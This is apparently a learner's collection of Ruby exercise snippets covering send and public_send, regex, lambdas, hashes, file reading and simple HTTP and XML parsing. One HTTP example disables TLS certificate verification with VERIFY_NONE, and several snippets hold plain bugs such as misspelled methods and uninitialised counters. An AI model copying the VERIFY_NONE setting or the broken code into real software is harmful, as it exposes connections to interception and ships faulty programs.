class KlassWithSecret
  def initialize
    @secret = 99
  end

  private

  def the_secret
    "Ssssh! The secret is #{@secret}."
  end
end

klass = KlassWithSecret.new

pp klass.instance_eval { @secret }
pp klass.instance_eval { the_secret }
pp klass.instance_eval {|obj| obj == self }





---




require 'linguistics'
Linguistics.use :en

pp 'post'.en.plural             # => "posts"
pp 'octopus'.en.plural          # => "octopi"
pp 'sheep'.en.plural            # => "sheep"
pp 'words'.en.plural            # => "words"
pp 'the blue mailman'.en.plural # => "the blue mailmen"
pp 'CamelOctopus'.en.plural     # => "CamelOctopi"
pp 'apple'.en.plural(1)         # => "apple"
pp 'apple'.en.plural(2)         # => "apples"
pp 'ley'.en.plural(:es)         # => "leyes"
pp 'ley'.en.plural(1)           # => "ley"





---




require 'pry-stack_explorer'

def alpha
  x = 'hello'
  beta
  pp x
end

def beta
  binding.pry
end

alpha

# show-stack
# frame 1





---




class MagicBox
  def say_hi;  puts 'Hi';  end
  def say_bye; puts'"Bye'; end

  private

  def say_secret
    puts 'Secret leaked, OMG'
  end

  protected

  def method_missing(method_name)
    puts "I didn't learn that word yet"
  end
end



box = MagicBox.new

word = 'hi'

print box.send("say_#{word}")                # => says the secret if word=secret
print box.public_send("say_#{word}")         # => does not say the secret, just pretends that it does not know about it and calls method_missing.

puts

secret = 'secret'

print box.send("say_#{secret}")              # => says the secret if word=secret
print box.public_send("say_#{secret}")       # => does not say the secret, just pretends that it does not know about it and calls method_missing.





---




1.send(:puts, 'hello send')
1.public_send(:puts, 'hello public_send')





---




require 'active_support/all'

pp 'Module'.constantize  # => Module
pp 'Class'.constantize   # => Class
pp 'blargle'.constantize # => NameError: wrong constant name blargle





---




class Greet
  def public_greet
    pp 'greet from public'
  end

  private

  def private_greet
    pp 'greet from private'
  end
end


greet = Greet.new

greet.send(:public_greet)
greet.send(:private_greet)
greet.public_send(:public_greet)
# greet.public_send(:private_greet)





---




full_name = 'Mia Smith Jr.'

def display string
  pp string
end

pp full_name.send('count', 'i')
pp full_name.send('size')
pp full_name.send(:upcase)
pp full_name.send(:downcase).split





pp full_name.public_send('count', 'i')
pp full_name.public_send('size')
pp full_name.public_send(:upcase)
pp full_name.public_send(:downcase).split





display full_name
send(:display, full_name.upcase.split)
# public_send(:display, full_name)





---




class DeviceReporter
  def initialize device
    @device = device
  end

  def call
    pp device.public_send(:tech_details)
  end

  private
  attr_reader :device
end



class Device
  def initialize(name, type, price, model)
    @name, @type, @price, @model = name, type, price, model
  end

  def tech_details
    {
      name:  name,
      type:  type,
      price: price,
      model: model
    }
  end

  private
  attr_reader :name, :type, :price, :model

  def total_price
    price.to_i + (price.to_i * 0.16)
  end
end



device = Device.new('Moto G8 Plus', 'cellphone', '350', 'G8')
pp device




deviceReporter = DeviceReporter.new(device).call
deviceReporter





---




class BookService
  attr_reader :params

  def initialize params
    @params = params
  end

  def service
    public_send("filter_by_#{params[:filter]}")
  end

  def filter_by_author
    pp 'filter by author'
  end

  def filter_by_editorial
    pp 'filter by editorial'
  end
end



first_param = { filter: 'author' }

first = BookService.new first_param
first.service



second_param = { filter: 'editorial' }

second = BookService.new second_param
second.service



third_param = { filter: 'something' }

third = BookService.new third_param
third.service





---




class NotifierService
  USER_FIELDS = [:name, :age]

  def initialize(notifier_type, message, user)
    @notifier_type, @message, @user = notifier_type, message, user
  end

  def notify
    @fields = user_fields
    send("notify_by_#{notifier_type}")
  end

  private
  attr_accessor :notifier_type, :user, :message

  def notify_by_email;    end
  def notify_by_sms;      end
  def notify_by_whatsapp; end

  def user_fields
    USER_FIELDS.each_with_object({}) do |field, memo|
      memo["#{field}"] = user.public_send(field)
    end
  end
end


class User
  def initialize(name, last_name, age)
    @name, @last_name, @age = name, last_name, age
  end

  def get_full_name
    name + " " + last_name
  end

  attr_accessor :name, :last_name

  private
  attr_reader :age

  def greet
    "Hi I am #{name} and I am #{age}"
  end
end



user = User.new('carl', 'smith', 29)
pp user

notifier_service = NotifierService.new('sms', 'Hello there!!', user).notify
pp notifier_service





---




USER_FIELDS = [:name, :age]
user = ['Carl', 45]

def user_fields user
  USER_FIELDS.each_with_object({}) do |field, memo|
    memo["#{field}"] = user.public_send(field) if user.respond_to?(field)
  end
end

pp user_fields user





---




pp 3 + 4
pp 3.send :+, 4

puts

class Book
  def show_cover?
    self.viewable_by == 'media'
  end

  def book_html
    if show_cover?
    else
      public_send(self.viewable_by)
    end
  end
end


book = Book.new.show_cover?

pp book
# pp book.book_html
# pp book.show_cover





---




class Sender
  def initialize struct
    @struct = struct
  end

  def display
    pp @struct
  end

  def mem method_name, param_name
    public_send :display, @struct[param_name]
  end
end



User = Struct.new(:name, :job, :gender, keyword_init: true)
user = User.new(name: 'rob', job: 'hexlet', gender: 'm')

sender = Sender.new user

user.display



sender.mem :display, :name





---




pp "Do you like cats?" =~ /like/





if "Do you like cats?".match(/like/)
  puts "Match found!"
end





def contains_vowel(str)
  str =~ /[aeiou]/
end

pp contains_vowel("test")
pp contains_vowel("sky")





def contains_number(str)
  str =~ /[0-9]/
end

pp contains_number("The year is 2015")
pp contains_number("The cat is black")





pp "5a5".match(/\d.\d/)
pp "5a5".match(/\d\.\d/)
pp "5.5".match(/\d\.\d/)





def ip_address?(str)
  !!(str =~ /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/)
end
pp ip_address?("192.168.1.1")
pp ip_address?("0000.0000")





pp "Regex are cool".match /\w{4}/
pp "Regex are cool".match /^\w{4}$/





Line = Struct.new(:time, :type, :msg)
LOG_FORMAT = /(\d{2}:\d{2}) (\w+) (.*)/

def parse_line(line)
  line.match(LOG_FORMAT) { |m| Line.new(*m.captures) }
end

pp parse_line("12:41 INFO User has logged in.")





pp (m = "John 31".match /\w+ (\d+)/)
pp m[1]





# pp (m = "David 30".match /(?\w+) (?\d+)/)
# pp m[:age]
# pp m[:name]





def number_after_word?(str)
  !!(str =~ /(?<=\w) (\d+)/)
end
pp number_after_word?("Grade 99")





puts /a/.class
pp regexp = Regexp.new("a")
pp regexp = %r{\w+}





pp "abc".match?(/[A-Z]/i)





pp "this is some string".scan(/\w+/)
pp "The year was 1492.".scan(/\d+/)
pp str = "lord of the rings"
pp str.gsub(/\w+/) { |w| w.capitalize }
pp email = "test@example.com"
pp !!email.match(/\A[\w.+-]+@\w+\.\w+\z/)





---




object = [ 1, '2', :b ]
age = 26

pp object.respond_to?(:sort)
pp object.respond_to?(:size)
pp object.respond_to?(:truncate)



pp age.respond_to?(:next)





---




result = %w[ / * - ** + ].map do |method|
  4.send method, 2
end

pp result






result = %w[ / * - ** + wow ].map do |method|
  4.send :respond_to?, method
end

pp result






class Song
  def song_title *arguments
    pp arguments.join(' ')
  end
end

song = Song.new

song.send :song_title, 'Send', 'me', 'a', 'River'






class Person
  attr_accessor :name, :age, :sex, :height, :race

  def initialize arguments
    arguments.each { |name, value| self.send("#{name}=", value) }
  end
end

person_1 = {
  name:   'James Jones',
  sex:    'M',
  height: 5.6
}

person_2 = {
  name:   'Paul Wilson',
  sex:    'M',
  height: 5.5,
  race:   'White'
}

james = Person.new person_1
paul = Person.new person_2

pp james
pp paul






class Package
  def can_sell_each
    pp 'this item can be sold separately'
  end

  private

  def cannot_sell_each
    pp 'this item cannot be sold separately'
  end
end

Package.new.can_sell_each
Package.new.cannot_sell_each



Package.new.send('can_sell_each')
Package.new.send('cannot_sell_each')



Package.new.public_send('can_sell_each')
Package.new.public_send('cannot_sell_each')





---




class Klass
  def hello *arguments
    puts 'Hello ' +  arguments.join(' ')
  end
end



klass = Klass.new

klass.send :hello, 'gentle', 'readers'
klass.public_send :hello, 'gentle', 'readers'





---




pp 'hello'.sub(/[aeiou]/, '*')
pp 'hello'.sub(/([aeiou])/, '<\1>')
pp 'hello'.sub(/./) {|s| s.ord.to_s + ' ' }
pp 'hello'.sub(/(?<foo>[aeiou])/, '*\k<foo>*')
pp 'Is SHELL your preferred shell?'.sub(/[[:upper:]]{2,}/, ENV)





---




(1..10)                  .tap {|x| puts "original: #{x}" }
  .to_a                  .tap {|x| puts "array:    #{x}" }
  .select {|x| x.even? } .tap {|x| puts "evens:    #{x}" }
  .map {|x| x*x }        .tap {|x| puts "squares:  #{x}" }





---




require 'net/http'
require 'uri'
require 'rexml/document'

CLOUDINESS = { 0 => 'clear', 1 => 'cloudy', 2 => 'overcast', 3 => 'murky' }

uri               = URI.parse 'https://xml.meteoservice.ru/export/gismeteo/point/34331.xml'
response          = Net::HTTP.get_response(uri)
doc               = REXML::Document.new(response.body)
city_name         = URI.decode_www_form(doc.root.elements['REPORT/TOWN'].attributes['sname'])
current_forecast  = doc.root.elements['REPORT/TOWN'].elements.to_a[0]

min_temp    = current_forecast.elements['TEMPERATURE'].attributes['min']
max_temp    = current_forecast.elements['TEMPERATURE'].attributes['max']
max_wind    = current_forecast.elements['WIND'].attributes['max']
cloud_index = current_forecast.elements['PHENOMENA'].attributes['cloudiness'].to_i

clouds = CLOUDINESS[cloud_index]

pp city_name
pp "Temperature: #{min_temp} / #{max_temp}"
pp "Wind: #{max_wind} m/s"
pp clouds





---




require 'rexml/document'
require 'date'

data_path = 'xml_files/expenses.xml'
abort "File don't found" unless File.exists?(data_path)

data_file     = File.new(data_path)
doc           = REXML::Document.new(data_file)
amount_by_day = Hash.new

doc.elements.each("expenses/expense") do |item|
  lose_sum = item.attributes["amount"].to_i
  lose_day = Date.parse(item.attributes["date"])

  amount_by_day[lose_day] ||= 0
  amount_by_day[lose_day] += lose_sum
end

data_file.close

sum_by_month  = Hash.new
current_month = amount_by_day.keys.sort[0].strftime("%B %Y")

amount_by_day.keys.sort.each do |key|
  sum_by_month[key.strftime("%B %Y")] ||= 0
  sum_by_month[key.strftime("%B %Y")] += amount_by_day[key]
end

puts "#{current_month} lose amount: #{sum_by_month[current_month]}"

amount_by_day.keys.sort.each do |key|
  if key.strftime("%B %Y") != current_month
    current_month = key.strftime("%B %Y")
    puts "#{current_month} lose amount: #{sum_by_month[current_month]}"
  end
  puts "\t#{key.day}: #{amount_by_day[key]}$"
end






---




pp 'my string'.yield_self { |string| string.upcase }
pp 3.next.yield_self { |number| number **number }.to_s





---




collection = [ 1, 2, 3, 4, 5, 6, 7, 8, 9 ]

def select_item quantity, collection
  collection = collection.take(quantity)
end

choice = ARGV[0]

puts "\nWe have #{collection.inspect}, take a piece..."

if choice == nil || !choice.is_a?(Numeric)
  print '\nEnter number: '
  choice = STDIN.gets.to_i
end

pp select_item(choice, collection)





---




def gen_diff data_1, data_2
  keys = data_1.keys | data_2.keys

  keys.each_with_object({}) do |key, hash|
    hash[key] = if !data_1.key?(key)
      'added'
    elsif !data_2.key?(key)
      'deleted'
    elsif data_1[key] == data_2[key]
      'unchanged'
    else
      'changed'
    end
  end
end

result = gen_diff(
  { one: 'eon', two: 'two', four: true },
  { two: 'own', zero: 4, four: true }
)

puts result





---




def intersection array_1, array_2
  result = []

  array_1.sort.each do |item|
    result << item if array_2.include? item
  end
  result
end

array_1 = [ 1, 8, 0 ]
array_2 = [ 1, 9, 0 ]

pp intersection(array_1, array_2)





---




def intersection collection_1, collection_2
  result = []
  collection_1.each do |item|
    result << item if collection_2.include? item
  end
  result
end

puts intersection([1, 3, 8], [9, 3, 1])
puts intersection([8], [5, 0])





---




require_relative 'exercise_ary_take_item_method.rb'

collection = [:Gor, :John, 12, 44, 'aaa', 'bbb', [cool: 'deal']]

pp collection
choice = ''

if choice != nil || !choice.is_a(Numeric)
  print "Enter number (0..#{collection.size}): "
  choice = STDIN.gets.to_i
end

puts 'Your choice:'
select_item choice, collection






---




def select_item quantity, array
  array = array.take quantity
end

pp select_item(2, %w[1 2 3 4 5])





---




def average start, finish
  count, sum = (finish - start + 1), 0
  start.upto(finish) { |number| sum += number }
  sum.to_f / count
end

puts average 3, 9





---




def valid_date? date
  day, month = date.split('-').map(&:to_i)
  day.between?(1, 31) && month.between?(1, 12)
end

pp valid_date?('11-11-2011')
pp valid_date?('13-11-2011')
pp valid_date?('11-13-2011')
pp valid_date?('55-11-2011')





---




file = File.open 'trump.txt', 'r'
@array = []

file.each_line do |line|
  words = line.split(/\s|\n|\.|\,|\(|\)|\-|\$/)

  words.each do |word|
    @array << word
  end
end


pp @array.reverse.join(' ')





---




def convert(strings)
  strings.filter { |string| string.end_with?('?') }
  .map(&:downcase)
  .sort
end

strings = %w[ wow? One? tWo! THREE ]

pp convert strings





---




module ThePresent
  def now
    pp "it's #{Time.new.hour > 12 ? Time.new.hour - 12 : Time.new.hour}:#{Time.new.min} #{Time.new.hour > 12 ? 'PM' : 'AM'} (GMT)"
  end
end

class TheHereAnd
  extend ThePresent
end

TheHereAnd.now





---




text = 'The will to win the desire to succeed the urge to reach your full potential'

def pig_it text
  text.split.map do |word|
    if /[A-Za-z]/ =~ word
      "#{word[1...word.length]}#{word[0]}ay"
    else
      word
    end
  end.join(' ')
end


pp pig_it(text)





---




text = 'The will to win the desire to succeed the urge to reach your full potential'

def pig_it text
  text.gsub(/(\w)(\w+)*/, '\2\1ay')
end


pp pig_it(text)





---




text = 'The will to win, the desire to succeed, the urge to reach your full potential… these are the keys 
that will unlock the door to personal excellence. Follow your heart. The mind is everything. What you think 
you become. We can easily forgive a child who is afraid of the dark; the real tragedy of life is when men 
are afraid of the light. If you let your past go, it doesn’t mean that your past will let you go. When you 
start thinking a lot about your past, it becomes your present and you can’t see your future without it. Wisdom 
is knowing how little we know. Everyone underwent something that changed him. We do not remember days, we 
remember moments. To live is the rarest thing in the world. Most people exist, that’s all.'

def top_3_words text
  text.gsub(/^A-Za-z'/, ' ')
  .downcase
  .split
  .each_with_object(Hash.new(0)) { |word, dict| dict[word] += 1 }
  .sort_by { |_name, value| -value }
  .first(3).to_h
end


pp top_3_words(text)





---




text = 'The will to win, the desire to succeed, the urge to reach your full potential… these are the keys that will 
unlock the door to personal excellence. Follow your heart. The mind is everything. What you think you become. We can 
easily forgive a child who is afraid of the dark; the real tragedy of life is when men are afraid of the light. If you let y
our past go, it doesn’t mean that your past will let you go. When you start thinking a lot about your past, it becomes 
your present and you can’t see your future without it. Wisdom is knowing how little we know. Everyone underwent something 
that changed him. We do not remember days, we remember moments. To live is the rarest thing in the world. Most people exist, that’s all.'

def top_3_words text
  result = text.gsub(/[^A-Za-z']/, ' ')
  .downcase
  .split
  .select { |word| word.match?(/[A-Za-z']/) }
  .each_with_object(Hash.new(0)) { |word, dict| dict[word] += 1 }
  .sort_by { |_name, value| -value }
  .first(3)
  .map(&:first)

  result
end


pp top_3_words(text)





---




def convert languages
  result = []

  languages.each do |name, _, typing_name|
    result << [name, typing_name]
  end

  result
end

data = [
  ['ruby', 'dynamic', 'strong'],
  ['js', 'dynamic', 'weak'],
  ['c', 'static', 'weak'],
  ['kotlin', 'static', 'strong']
]

pp convert(data)




def convert languages
  result = []
  languages.map { |(name, _, typing_name)| [name, typing_name] }
  result
end





---




def words_by_letters sentence
  words = sentence.split

  words.each_with_object({}) do |word, acc|
    acc[word[0]] ||= []
    acc[word[0]] << word
  end
end

sentence = 'hexlet helps people to become developers'

pp words_by_letters(sentence)





---




# def fizz_buzz(start, stop)
#   range = (start..stop).to_a
#   result = []
#
#   range.each do |n|
#     result << if (n % 3).zero? && (n % 5).zero?
#                 'FizzBuzz'
#               elsif (n % 5).zero?
#                 'Buzz'
#               elsif (n % 3).zero?
#                 'Fizz'
#               else
#                 n
#               end
#   end
#   result.join(' ') if start <= stop
#
# end

def fizz_buzz(start, stop)
  user_range = (start..stop).to_a
  check_number(user_range) if start <= stop
end

def check_number(ary)
  start = ary[0]
  result = []

  while start <= ary[-1]
    if (start % 3).zero? && (start % 5).zero?
      result << 'FizzBuzz'
    elsif (start % 5).zero?
      result << 'Buzz'
    elsif (start % 3).zero?
      result << 'Fizz'
    else
      result << start
    end

    start += 1
  end
  result.join(' ')
end


pp fizz_buzz(46, 56)





---




def get_words_count_by_lang data
  words  = data.split
  result = {}

  words.each do |word|
    result[word] ||= 0
    result[word] += 1
  end
  result
end

text = 'php ruby php java javascript go go go'


pp get_words_count_by_lang(text)





---




def get_words_count_by_lang data
  # simple solution: data.split.tally
  words  = data.split
  result = {}
  words.each do |word|
    result[word] ||= 0
    result[word] += 1
  end
  result
end

text = 'php ruby php java javascript go go go'


pp get_words_count_by_lang text

# {
#   php: 2,
#   ruby: 1,
#   java: 1,
#   javascript: 1,
#   go: 3
# }





---




def link_to(name, link, attributes = {})
  attr_pairs = attributes.any? ? [''] : []

  attributes.each do |name, value|
    attr_pairs << "#{name}='#{value}'"
  end

  html_attr = attr_pairs.join(' ')

  puts "<a href='#{link}'#{html_attr}>#{name}</a>"
end

link_to 'link_name', '/url', class: 'link'





---




require 'mechanize'

agent = Mechanize.new
chosen = false

until chosen
  page        = agent.get("https://www.kinopoisk.ru/lists/movies/top500/#{rand(5)}/")
  movie_block = page.search("div[styles_root__ti07r](@class, 'styles_root__ti07r')")
  movie       = page.search("//span[styles_position__TDe4E(@class, 'styles_position__TDe4E')]").to_a.sample
  # movie_title
  # movie_rating
  # movie_link
  # movie_overview
end





---




def pangram? text
  ('a'..'z').each { |char| return false unless text[char] }
  true
end

pangram     = 'A quick brown fox jumps over the lazy dog'
not_pangram = 'Something else'


pp pangram?(pangram)
pp pangram?(not_pangram)





---




def sort_cases(data)
  sorted_cases = data.sort_by do |row|
    # destructuring example
    day, month, year = row.first.split('-')
    Time.new(year, month, day)
  end

  sorted_cases.reverse
end

data = [
  ['11-9-2020',  'russia', 10_000],
  ['11-10-2020', 'usa',    35_000],
  ['13-12-2020', 'india',  55_000],
  ['12-11-2020', 'russia', 13_000],
  ['12-12-2020', 'usa',    22_000],
  ['11-12-2020', 'india',  54_000],
]

pp sort_cases data

# result= [
#   ['13-12-2020', 'india',  55_000],
#   ['12-12-2020', 'usa',    22_000],
#   ['11-12-2020', 'india',  54_000],
#   ['12-11-2020', 'russia', 13_000],
#   ['11-10-2020', 'usa',    35_000],
#   ['11-9-2020',  'russia', 10_000]
# ]





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-----
files
-----


file = File.open 'text_files/trump.txt', 'r'

@options = {}

def add_to_hash word
  unless word.empty?
    word.downcase!

    count = @options[word].to_i
    count += 1
    @options[word] = count
  end
end

file.each_line do |line|
  array = line.split(/\s|\n|\.|,|\;|\-|\'|\"|\(|\)|\-/)
  array.each {|word| add_to_hash(word)}
end

file.close

@options.each do |name, value|
  puts "#{value} #{name}"
end





---




file = File.open 'text_files/trump.txt', 'r+'

@array   = []
@options = {}

file.each_line do |line|
  path_name = line.split(/\ /)
  @array << path_name
end

@array.each do |element|
  @options[element[0]] = element[1].strip!
end


pp @array
pp @options





---




require_relative 'filesOutputClass.rb'

input = ARGV[0]
file  = File.new input
lines = file.readlines

abort "File don't round!" unless File.exist? input

file.close

new_file = FileOutput.new


pp new_file.file_read
pp new_file.show_lines





class FileOutput
  def initialeze
    @empti_line_counter = 0
    @line = 0
    @last_five_lines = []
    @lines = []
  end

  def file_read
    @lines.each_with_index do |line, index|
      @empty_line_counter += 1 if line == "\n"
      @last_five_lines << line if @lines.size <= 5
    end
  end

  def show_lines
    puts 'File opened'
    puts "All lines: #{@lines.lenght.to_s}"
    puts "Empty lines: #{@empty_line_counter.to_s}"
    puts 'Last five lines:'

    @last_five_lines.each_with_index do |item, index|
      puts "#{index + 1}. #{item}"
    end
  end
end





---




input = File.open 'text_files/text.txt', 'r'

while line = input.gets
  puts line
end

input.close





---




input = File.open 'text_files/text.txt', 'r'
total = 0

while line = input.gets
  array = line.split ','
  value = array[1].to_i
  total += value
end

puts "Total: #{total}"





---




puts 'Today you are invited to watch a movie:'

current_path = File.dirname __FILE__
file_path    = current_path + '/filmDescription.txt'

if File.exist? file_path
  file  = File.new file_path
  lines = file.readlines

  file.close

  number = rand(lines.length)
  number -= 1 if number % 2 == 1

  puts lines[number]
  puts lines[number + 1]
else
  puts 'File did not found'
end





---




input = File.open 'text_files/file.A1.txt', 'r'

while line = input.gets
  line.strip!
  puts line
end





---




file = File.open "text_files/file.A1.txt"

line  = file.readline
lines = file.readlines

puts line[0]
puts
puts line
puts
puts lines[0]
puts
puts lines

file.close





---




current_path = File.dirname __FILE__
file_path    = current_path + './file.A1.txt'

puts 'Today you have:'

if File.exist? './file.A1.txt'
  file = File.new './file.A1.txt'
  line = file.readlines

  file.close

  puts line.sample
else
  puts "File don't found!"
end





---




file_name = ARGV[0]

abort 'Input file name: ' if file_name == nil
abort 'File is not found!' unless File.exist? file_name

file  = File.new file_name
lines = file.readlines

file.close

puts 'File opened: ' + file_name

empty_lines_counter = 0
last_five_lines     = []

lines.each_with_index do |line, index|
  empty_lines_counter += 1 if line == "\n"
  last_five_lines << line if lines.size - index <= 5
end

puts 'All lines: ' + lines.length.to_s
puts 'Empty lines: ' + empty_lines_counter.to_s
puts 'Last 5 lines: '

puts

for line in last_five_lines
  puts line
end





---




require_relative 'text_files/file_2.txt'

file  = File.new 'text_files/file_2.txt'
lines = file.readlines

empty_lines_counter = 0
last_five_lines     = []

lines.each_with_index do |line, index|
  if line == "\n"
    empty_lines_counter += 1
  end

  if lines.size - index <= 5
    last_five_lines << line
  end
end

puts "All lines: #{lines.size.to_s}"
puts "Empty lines: #{empty_lines_counter.size.to_s}"
puts 'Last 5 lines:'

for line in last_five_lines
  puts line
end




----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

---------
benchmark
---------


require 'benchmark'

string_AZ = Hash[('a'..'z').to_a.zip((1..26).to_a)]
symbol_AZ = Hash[(:a..:z).to_a.zip((1..26).to_a)]

string_time = Benchmark.realtime do
  100_000.times { string_AZ['r'] }
end

symbol_time = Benchmark.realtime do
  100_000.times { symbol_AZ[:r] }
end


pp "String time: #{string_time} seconds."
pp "Symbol time: #{symbol_time} seconds."




----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-------
parsing
-------


require 'open-uri'
require 'nokogiri'
require 'net/http'
require 'net/https'

uri = URI('https://httpbin.org')
get_path = 'get'
post_path = 'post'

Net::HTTP.start(uri.host, uri.port, use_ssl: uri.scheme == 'https', verify_mode: OpenSSL::SSL::VERIFY_NONE) do |http|
  request  = Net::HTTP::Get.new uri.request_uri + get_path
  response = http.request request

  puts response.body

  # cookie = response.response['set-cookie'].split('; ')[0]

  params = {
    test: true,
    hello: 'world'
  }

  request = Net::HTTP::Post.new uri.request_uri + post_path
  request.body = URI.encode_www_form(params)
  # request['Cookie'] = cookie

  response = http.request request

  puts response.body

  response.code == '200'
end




----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

----
hash
----


def plainify data
  result = []

  data.each_pair do |band_name, songs|
    songs.each do |song_name|
      result << { band: band_name, song: song_name }
    end
  end

  result
end

data = {
  Queen:           ['Bohemian Rhapsody',  "Don't Stop Me Now"],
  Metallica:       ['Nothing Else Matters'],
  "Guns N' Roses": ['Paradise City', 'November Rain'],
  'AC/DC':         ['Thunderstruck', 'Back In Black', 'Shoot to Thrill']
}


pp plainify(data)





---




@book = {}

def add_person options
  puts 'Already exists' if @book[options[:name]]

  @book[options[:name]] = options[:age]
end

def show_book
  @book.keys.each do |name|
    age = @book[name]
    pp "Name: #{name}, age: #{@book[name]}"
  end
end

loop do
  print 'Input name: '
  name = gets.strip.capitalize

  show_book if name == ''

  print 'Input age: '
  age = gets.strip

  add_person name: name, age: age
end





---




balls = {
  soccer_ball: { weight: 410, colors: [ :red, :blue ] },
  tennis_ball: { weight: 58, colors: [ :yellow, :white ] },
  golf_ball:   { weight: 45, colors: [ :white ] }
}

soccer_balls_colors = balls[ :soccer_ball ][ :colors ]
pp soccer_balls_colors

soccer_balls_weight = balls[ :soccer_ball ][ :weight ]
pp soccer_balls_weight

balls[ :soccer_ball ][ :colors ].push(:green)
pp soccer_balls_colors






balls = [
  { type: :soccer_ball, weight: 410, colors: [ :red, :blue ] },
  { type: :tennis_ball, weight: 58, colors: [ :yellow, :white ] },
  { type: :golf_ball, weight: 45, colors: [ :white ] }
]

@cart = [
  { type: :soccer_ball, qty: 2 },
  { type: :tennis_ball, qty: 3 }
]

inventory = {
  soccer_ball: { available: 2, price_per_item: 100 },
  tennis_ball: { available: 1, price_per_item: 30 },
  golf_ball:   { available: 5, price_per_item: 5 }
}

def qtys_array
  sum = []
  @cart.each { |hash| sum << hash[:qty] }
  sum
end

pp qtys_array






def total
  sum = 0
  qtys_array.each { |qty| sum += qty }
end

pp total





---




hash = {
  chocolate: 10,
  icecream:  20,
  shugar:    30
}

pp hash.each { |name, value| hash[name] = value * 5 }





hash = {
  chocolate: 10,
  icecream:  20,
  shugar:    30
}

pp hash.transform_values { |value| value * 5 }





hash = {
  chocolate: 10,
  icecream:  20,
  shugar:    30
}

pp hash.transform_keys { |name| name[0].to_sym }





---




@options = { 'key': 'value', 'key_2': 'value_2' }

def returner(key, value = nil)
  pp @options.fetch(key.to_s, value)
end

returner(:key).inspect
returner(:key_2, 'lala').inspect
returner(:new, 'ehu').inspect
returner(:lalala).inspect
returner(:lalala, 'default').inspect





---




# include

module Homable
  def has_home?
    true
  end
end

class Cat
  include Homable

  def has_home?
    false
  end
end

pp "include: #{Cat.new.has_home?}"

pp Cat.ancestors





# prepend

module Homable
  def has_home?
    true
  end
end

class Cat
  prepend Homable

  def has_home?
    false
  end
end

pp "prepend: #{Cat.new.has_home?}"

pp Cat.ancestors




# extend

module Homable
  attr_accessor :name

  def initialize name
    @name = name
  end

  def has_home?
    true
  end

  def attribute name
    name.upcase
  end
end

class Cat
  extend Homable
  attribute :name
end


cat = Cat.new 'Ivan'

pp cat.attribute 'Eric'





---





require 'happymapper'

class Address
  include HappyMapper

  tag 'query'

  element :country,      String, tag: 'country'
  element :country_code, String, tag: 'countryCode'
  element :city,         String, tag: 'city'
  element :lat,          Float,  tag: 'lat'
  element :lon,          Float,  tag: 'lon'

  def lat
    @lat.round(2)
  end

  def lon
    @lon.round(2)
  end

  def country
    @country
  end

  def country_code
    @country_code
  end

  def city
    @city
  end
end





require_relative "ipgeobase_general_happymapper"
require "addressable/template"
require "net/http"

# Service to get location info by ip
module Ipgeobase
  class << self
    API_URL = 'http://ip-api.com'

    def lookup(ip)
      uri = Addressable::Template.new("#{API_URL}{/segments*}{?fields}").expand({
        'segments': ['xml', ip.to_s],
        'fields':   'country,countryCode,city,lat,lon'
      })
      xml = Net::HTTP.get uri
      Address.parse xml
    end
  end
end





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

------
lambda
------


say_hi = lambda { pp 'Hi' }
say_by = lambda { pp 'Bye' }

week = %w[ say_hi say_hi say_hi say_hi say_hi say_hi say_by say_by ]

week.each do |f|
  pp f
end





---




plus_10 = lambda { |number| number + 10 }
plus_20 = lambda { |number| number + 20 }
subs_5 =  lambda { |number| number - 5 }

a = plus_10.call 100
pp a

b = plus_20.call 56
pp b

c = subs_5.call 1
pp c





---




strings = %w[ leonardo donatello raphael michaelangelo ]

symbolize = -> (param) { param.to_sym }
symbols   = strings.collect(&symbolize)


pp symbols





---




my_array = ['raindrops', :kettles, 'whiskers', :mittens, :packages]

symbol_filter = -> (element) { element.is_a? Symbol }
symbols       = my_array.select &symbol_filter


pp symbols





---




odds_n_ends = [:weezard, 42, 'Trady Blix', 3, true, 19, 12.345]

int_store = Proc.new { |element| element.is_a? Integer }
ints = odds_n_ends.select(&int_store)


pp ints





---




odds_n_ends = [:weezard, 42, 'Trady Blix', 3, true, 19, 12.345]

int_store = -> element { element.is_a? Integer }
ints = odds_n_ends.select(&int_store)


pp ints





---




crew = {
  captain:        'Picard',
  first_officer:  'Riker',
  lt_cdr:         'Data',
  lt:             'Worf',
  ensign:         'Ro',
  counselor:      'Troi',
  chief_engineer: 'LaForge',
  doctor:         'Crusher'
}

first_half = -> (name, value) { value < 'M' }
a_to_m = crew.select &first_half


pp a_to_m.values





---




def batman_ironman_proc
  victor = Proc.new { return 'BATMAN win' }
  victor.call
  'IRON MAN win'
end

pp batman_ironman_proc


def batman_ironman_lambda
  victor = lambda { return 'BATMAN win' }
  victor.call
  'IRON MAN win'
end

pp batman_ironman_lambda





---




say_hi  = lambda { pp 'Hi' }
say_bye = lambda { pp 'Bye' }

say_hi.call
say_bye.call

puts


week = %w[ say_hi say_hi say_hi say_hi say_hi say_bye say_bye ]

sub_10 = lambda do |number|
  number - 10
end

a = sub_10.call 1000

pp a

puts


add_10 = -> number { pp number + 10 }
add_20 = -> number { pp number + 20 }
sub_5  = -> number { pp number - 5 }

number = 1000

add_10.call number
add_20.call number
sub_5.call number





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------




def sum_of_digits(num_as_string)
  sum = 0
  
  num_as_string.each_char do |char|
    sum += char.to_i
  end
  sum
end

def happy?(number)
  num_as_string = number.to_s
  half_count    = num_as_string.length / 2
  left_sum      = sum_of_digits num_as_string[0, half_count]
  right_sum     = sum_of_digits num_as_string[half_count..]

  left_sum == right_sum
end

pp happy?(77)
pp happy?(7881)
pp happy?(732930)






---




def my_map collection
  result = []

  collection.each do |element|
    result << yield(element)
  end
  result
end

pp my_map([1, 2, 3]) { |element| element * 2 }





----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------






----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

--------------
method missing
--------------


class User
  def initialize(name)
    @name = name
  end

  def hello
    puts "Hello, #{@name}"
  end

  def method_missing(_)
    hello
  end
end



user = User.new('Greg')

user.hello
